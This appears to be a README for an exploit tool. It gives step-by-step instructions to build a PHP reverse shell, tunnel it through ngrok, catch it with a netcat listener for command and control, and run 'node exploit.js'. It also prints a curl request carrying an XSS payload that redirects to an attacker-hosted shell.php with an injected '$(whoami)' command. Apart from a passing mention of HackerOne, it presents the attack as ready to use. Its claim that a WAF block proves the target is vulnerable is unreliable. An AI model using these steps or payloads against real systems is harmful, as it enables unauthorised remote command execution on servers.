In order to use this test file, please follow the instructions below:

First, you'll need to create a php reverse shell payload and tunnel this through ngrok. You'll require a secondary server or to use ngrok to host the file that will be uploaded to the remote server as well. Once you have this ready then you can proceed (or you can use the reverse shell code from my GitHub. If you choose to use my php shell code. You can either configure it with netcat listener or you can create an output file to your server for the reverse listener to output the information captured from the remote server that's being attacked with the reverse shell. If you choose to not use the output file then you can remove it from the shell code and open a nc listener to the loopback address which you opened ngrok on to get the command and control. Please use this exploit wisely) 

Dependencies required are npm and node.js

sudo su
apt-get update
apt-get install nodejs
apt-get install npm

Once done. Clone the repository and follow these commands:

npm init -y
npm install http

Finally, run the exploit using this command:

node exploit.js

Done.

Please note that if you receive any errors such as 301 Permanently Moved by CloudFlare then it's obviously CloudFlare that's blocking the endpoint from receiving the request. Nonetheless, this test will work in other ways.

To check if a WAF is responsible for the 301 Permanently Moved, confirm with a curl command: 

curl -X POST -H "Content-Type: application/json" -d '{"device_id":"<img src=x onerror=\"window.location='http://[SECONDARY HOST OF THE REVERSE SHELL OR NGROK CONTAINING THE PAYLOAD TO EXECUTE TO REMOTE SERVER]/shell.php?cmd=$(whoami)'\">"}' https://[HOSTNAME OF THE VULNERABLE ENDPOINT]/[VULNERABLE ENDPOINT]

If you receive an error from the WAF saying that the request was blocked due to the execution of an arbitrary code such as SQL then the target is vulnerable and you can report it to HackerOne.